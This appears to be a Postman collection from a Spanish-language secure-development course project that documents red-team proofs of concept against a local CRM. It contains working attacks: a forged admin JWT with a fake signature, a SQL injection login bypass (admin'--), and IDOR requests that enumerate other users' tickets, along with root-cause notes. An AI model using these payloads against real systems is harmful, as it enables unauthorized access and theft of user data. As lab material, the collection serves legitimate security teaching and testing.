@@ -1,0 +1,303 @@
+{
+  "info": {
+    "name": "Hito 2 · PoC Equipo Rojo · Secure CRM",
+    "description": "Colección de Pruebas de Concepto (PoC) del Equipo rojo para el Hito 2 del Proyecto Final de Desarrollo Seguro.\n\nEntorno: instancia local via WAF http://localhost:8080 con Colima. WAF en modo DetectionOnly.\nFecha de ejecución: 2026-11-09\nResponsable: Davis Roldán\n\nEstos tres requests reproducen los hallazgos confirmados en Burp Suite y generan eventos en el WAF que el Equipo azul puede correlacionar en Kibana durante H3.\n\nPara ejecutar: importar esta colección en Postman, asegurarse de que el entorno local esté corriendo (http://localhost:8080/api/health → 200) y ejecutar los requests en orden.",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "variable": [
+    {
+      "key": "base_url",
+      "value": "http://localhost:8080",
+      "type": "string"
+    },
+    {
+      "key": "token_viewer",
+      "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjQsInVzZXJuYW1lIjoidmlld2VyIiwicm9sZSI6InZpZXdlciIsImlhdCI6MTc5NDI0MTEyMX0.iYYCcFEoIeXe_IeS22cvCqqZCLdD524IRHENp0Q85vA",
+      "type": "string",
+      "description": "Token legítimo de la cuenta viewer (id:4). Obtenido con POST /api/auth/login {username:viewer, password:viewer}."
+    },
+    {
+      "key": "token_forjado",
+      "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjQsInVzZXJuYW1lIjoidmlld2VyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzk0MjQxMTIxfQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "type": "string",
+      "description": "Token forjado: mismo sub/username que viewer pero role:admin y firma completamente falsa (AAAA...). Demuestra CWE-347 — el servidor nunca verifica la firma."
+    }
+  ],
+  "item": [
+    {
+      "name": "PoC-01 · JWT sin verificación de firma (CVSS 9.8 Crítica)",
+      "item": [
+        {
+          "name": "1a · Obtener token viewer legítimo",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('Login viewer exitoso', () => {",
+                  "    pm.response.to.have.status(200);",
+                  "    const json = pm.response.json();",
+                  "    pm.expect(json).to.have.property('token');",
+                  "    pm.expect(json.user.role).to.eql('viewer');",
+                  "    pm.collectionVariables.set('token_viewer', json.token);",
+                  "    console.log('[PoC-01a] Token viewer obtenido:', json.token.substring(0, 40) + '...');",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\"username\":\"viewer\",\"password\":\"viewer\"}"
+            },
+            "url": {
+              "raw": "{{base_url}}/api/auth/login",
+              "host": ["{{base_url}}"],
+              "path": ["api", "auth", "login"]
+            },
+            "description": "Obtiene un token legítimo de viewer para usarlo como base del token forjado. El resultado se guarda en la variable token_viewer."
+          }
+        },
+        {
+          "name": "1b · Acceder a /api/users con JWT forjado (role:admin, firma falsa)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('[PoC-01] Servidor acepta JWT con firma falsa → 200', () => {",
+                  "    pm.response.to.have.status(200);",
+                  "    const json = pm.response.json();",
+                  "    pm.expect(json).to.be.an('array');",
+                  "    pm.expect(json.length).to.be.greaterThan(0);",
+                  "    console.log('[PoC-01b] VULNERABILIDAD CONFIRMADA: JWT forjado aceptado.');",
+                  "    console.log('[PoC-01b] Usuarios expuestos:', json.length);",
+                  "    console.log('[PoC-01b] passwordHash del admin:', json[0].passwordHash);",
+                  "});",
+                  "",
+                  "pm.test('Respuesta incluye passwordHash (dato sensible)', () => {",
+                  "    const json = pm.response.json();",
+                  "    pm.expect(json[0]).to.have.property('passwordHash');",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_forjado}}",
+                "description": "Token con role:admin y firma AAAA... El servidor usa jwt.decode() en lugar de jwt.verify() → acepta cualquier firma."
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/users",
+              "host": ["{{base_url}}"],
+              "path": ["api", "users"]
+            },
+            "description": "OWASP A07 · CWE-347 · CVSS 9.8 Crítica\n\nEnvía un JWT con payload {role:admin} y firma completamente falsa (AAAA...). El middleware usa jwt.decode() en lugar de jwt.verify(), por lo que la firma nunca se valida y el servidor devuelve 200 con la lista completa de usuarios incluyendo passwordHash.\n\nCausa raíz: apps/api/src/middleware/auth.ts:21 — jwt.decode(token) en lugar de jwt.verify(token, secret).\n\nEvidencia: docs/shots/burp/repeater-jwt-forged.png"
+          }
+        }
+      ]
+    },
+    {
+      "name": "PoC-02 · SQL Injection en login (CVSS 8.1 Alta)",
+      "item": [
+        {
+          "name": "2a · SQLi — obtener token admin sin contraseña",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('[PoC-02] SQLi exitosa → 200 con token de admin', () => {",
+                  "    pm.response.to.have.status(200);",
+                  "    const json = pm.response.json();",
+                  "    pm.expect(json).to.have.property('token');",
+                  "    pm.expect(json.user.role).to.eql('admin');",
+                  "    pm.expect(json.user.username).to.eql('admin');",
+                  "    pm.collectionVariables.set('token_admin_sqli', json.token);",
+                  "    console.log('[PoC-02] VULNERABILIDAD CONFIRMADA: login sin contraseña válida.');",
+                  "    console.log('[PoC-02] Token admin obtenido:', json.token.substring(0, 40) + '...');",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\"username\":\"admin'--\",\"password\":\"loquesea\"}"
+            },
+            "url": {
+              "raw": "{{base_url}}/api/auth/login",
+              "host": ["{{base_url}}"],
+              "path": ["api", "auth", "login"]
+            },
+            "description": "OWASP A05 · CWE-89 · CVSS 8.1 Alta\n\nEl payload admin'-- cierra la cadena del username y comenta el resto de la consulta SQL:\n  SELECT * FROM users WHERE username = 'admin'--' AND password_hash = '...'\nLa condición de contraseña queda comentada → siempre devuelve el usuario admin.\n\nCausa raíz: apps/api/src/auth.ts:30 — consulta construida por concatenación de strings.\n\nEvidencia: docs/shots/burp/repeater-sqli.png"
+          }
+        },
+        {
+          "name": "2b · Verificar error verboso con comilla suelta (H-10 relacionado)",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('[PoC-02b] Error expone estructura SQL → 500', () => {",
+                  "    pm.response.to.have.status(500);",
+                  "    const json = pm.response.json();",
+                  "    pm.expect(json).to.have.property('sql');",
+                  "    console.log('[PoC-02b] SQL expuesto en respuesta:', json.sql);",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\"username\":\"admin'\",\"password\":\"x\"}"
+            },
+            "url": {
+              "raw": "{{base_url}}/api/auth/login",
+              "host": ["{{base_url}}"],
+              "path": ["api", "auth", "login"]
+            },
+            "description": "Comilla sin cerrar dispara un error SQL que la API devuelve en la respuesta con la consulta completa. Relacionado con H-10 (mensajes de error verbosos). Facilita afinar el payload de SQLi."
+          }
+        }
+      ]
+    },
+    {
+      "name": "PoC-03 · IDOR en tickets (CVSS 8.1 Alta)",
+      "item": [
+        {
+          "name": "3a · Login viewer legítimo",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('Login viewer para IDOR', () => {",
+                  "    pm.response.to.have.status(200);",
+                  "    const json = pm.response.json();",
+                  "    pm.collectionVariables.set('token_viewer', json.token);",
+                  "    console.log('[PoC-03a] Token viewer listo para IDOR.');",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "POST",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\"username\":\"viewer\",\"password\":\"viewer\"}"
+            },
+            "url": {
+              "raw": "{{base_url}}/api/auth/login",
+              "host": ["{{base_url}}"],
+              "path": ["api", "auth", "login"]
+            },
+            "description": "Obtiene un token legítimo de viewer (id:4, rol mínimo). Se usará para acceder a tickets que no le pertenecen."
+          }
+        },
+        {
+          "name": "3b · IDOR — viewer lee ticket ajeno #1",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('[PoC-03] IDOR confirmado → viewer lee ticket ajeno (200)', () => {",
+                  "    pm.response.to.have.status(200);",
+                  "    const json = pm.response.json();",
+                  "    pm.expect(json).to.have.property('id');",
+                  "    pm.expect(json).to.have.property('customerEmail');",
+                  "    console.log('[PoC-03b] VULNERABILIDAD CONFIRMADA: IDOR en tickets.');",
+                  "    console.log('[PoC-03b] Ticket accedido:', json.id, '-', json.title);",
+                  "    console.log('[PoC-03b] Cliente expuesto:', json.customerName, '/', json.customerEmail);",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_viewer}}",
+                "description": "Token de viewer (id:4). El ticket #1 fue creado por admin y asignado a jperez — viewer no tiene relación con él."
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/tickets/1",
+              "host": ["{{base_url}}"],
+              "path": ["api", "tickets", "1"]
+            },
+            "description": "OWASP A01 · CWE-639 · CVSS 8.1 Alta\n\nUn viewer (rol de solo lectura, sin tickets asignados) accede al ticket #1 perteneciente a otro usuario. La API devuelve 200 con todos los datos: título, descripción, nombre y correo del cliente y agente asignado.\n\nCausa raíz: apps/api/src/routes/tickets.ts:51 — no verifica ticket.assignee_id ni el rol del solicitante antes de devolver el objeto.\n\nEvidencia: docs/shots/burp/repeater-idor.png"
+          }
+        },
+        {
+          "name": "3c · IDOR — enumerar tickets #2 y #3",
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "exec": [
+                  "pm.test('[PoC-03c] Enumeración IDOR — ticket adicional accesible', () => {",
+                  "    pm.response.to.have.status(200);",
+                  "    const json = pm.response.json();",
+                  "    console.log('[PoC-03c] Ticket enumerado:', json.id, '-', json.title);",
+                  "});"
+                ],
+                "type": "text/javascript"
+              }
+            }
+          ],
+          "request": {
+            "method": "GET",
+            "header": [
+              {
+                "key": "Authorization",
+                "value": "Bearer {{token_viewer}}"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/tickets/2",
+              "host": ["{{base_url}}"],
+              "path": ["api", "tickets", "2"]
+            },
+            "description": "Demuestra que el IDOR es enumerable: incrementando el id se accede a cualquier ticket. En un entorno real permite extraer todos los registros con un script."
+          }
+        }
+      ]
+    }
+  ]
+}
